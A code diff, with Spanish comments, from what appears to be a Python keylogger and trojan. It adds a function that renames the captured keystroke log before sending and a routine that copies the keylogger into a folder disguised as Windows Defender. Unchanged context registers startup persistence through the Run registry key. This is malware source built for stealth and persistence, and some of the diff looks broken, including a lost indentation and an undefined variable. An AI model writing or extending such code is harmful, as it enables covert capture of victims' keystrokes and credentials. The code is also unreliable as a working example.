@@ -101,6 +101,17 @@ class Util:
         except:
             print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
 
+    def RenameFileKey(self): # Renombre el archivo log, antes de ser envíado
+        try:
+            CreateDir()  # Crea el directorio ==> C:\Users\Public\Security\Windows Defender
+            # Copia el archivo
+            pathO = logKeyPath() + LogName()
+            pathN = logKeyPath() + name
+            os.rename(pathO, pathN)
+            print("El archivo reg.k se renombró correctamente")
+        except:
+            print("No se puedo renombrar el archivo 'reg.k' ")
+            pass
 
     def addStartUp(self):
         keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
@@ -116,8 +127,14 @@ class Util:
         self.CreateFolders()
         try:
             with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
-                print("[T]El keylogger ya se encontraba oculta en la carpeta: \n[" + Config().PATH_KEY+ "]")
+            print("[Trojan] - Ya se encuentra en el sistema : \n[" + Config().PATH_KEY+ "]")
         except:
+            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
+            try:
+                shutil.copy(Config().NAME_KEY, Config().PATH_KEY)  # Intenta ocultar el keylogger en una carpeta
+                print("\n[Trojan] - Se replico en el sistema correctamente")
+            except:
+                print("\n[Trojan] - Hubo un problema al replicar en el sistema")
 
 
 
